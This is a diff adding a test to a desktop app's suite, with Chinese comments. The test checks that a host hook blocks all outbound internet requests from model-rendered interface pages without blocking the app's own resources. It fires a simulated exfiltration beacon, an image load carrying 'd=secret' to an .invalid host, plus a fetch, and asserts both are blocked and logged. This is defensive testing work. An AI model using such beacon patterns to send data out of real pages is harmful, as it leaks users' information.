@@ -137,3 +137,44 @@ test("reissues the local control identity when the backend restarts", async () =
     await app.close();
   }
 });
+
+/** 宿主在界面会话里拦下的公网请求（`renderer_outbound_blocked`），读自临时数据根下的桌面日志。 */
+function blockedOrigins(home: string): string[] {
+  const logDir = path.join(home, ".cosir", "logs");
+  if (!fs.existsSync(logDir)) return [];
+  return fs.readdirSync(logDir)
+    .filter((name) => name.startsWith("desktop-") && name.endsWith(".log"))
+    .flatMap((name) => fs.readFileSync(path.join(logDir, name), "utf8").split("\n"))
+    .filter(Boolean)
+    .map((line) => JSON.parse(line) as { event?: string; data?: { origin?: string } })
+    .filter((line) => line.event === "renderer_outbound_blocked")
+    .map((line) => String(line.data?.origin));
+}
+
+/**
+ * 界面渲染模型写的内容不联网：宿主钩子拦下界面会话的一切公网请求。目的：模型挑的主机名与参数一显示就外传；
+ * 潜在缺陷：拦截误伤界面自身的资源（启动到外壳出现时不应有任何拦截记录）。被拦的请求在发出前取消，不真的联网。
+ */
+test("keeps the app's pages off the internet without blocking the app itself", async () => {
+  const { app, page, home } = await launchDesktop();
+  try {
+    await waitForAppShell(page);
+    expect(blockedOrigins(home)).toEqual([]);
+    const outcome = await page.evaluate(async () => {
+      const image = await new Promise<string>((resolve) => {
+        const probe = new Image();
+        probe.onload = () => resolve("loaded");
+        probe.onerror = () => resolve("blocked");
+        probe.src = "https://egress-probe.invalid/favicon.ico?d=secret";
+      });
+      const request = await fetch("https://egress-probe-fetch.invalid/").then(() => "sent", () => "blocked");
+      return { image, request };
+    });
+    expect(outcome).toEqual({ image: "blocked", request: "blocked" });
+    await expect.poll(() => blockedOrigins(home)).toEqual(expect.arrayContaining([
+      "https://egress-probe.invalid", "https://egress-probe-fetch.invalid",
+    ]));
+  } finally {
+    await app.close();
+  }
+});
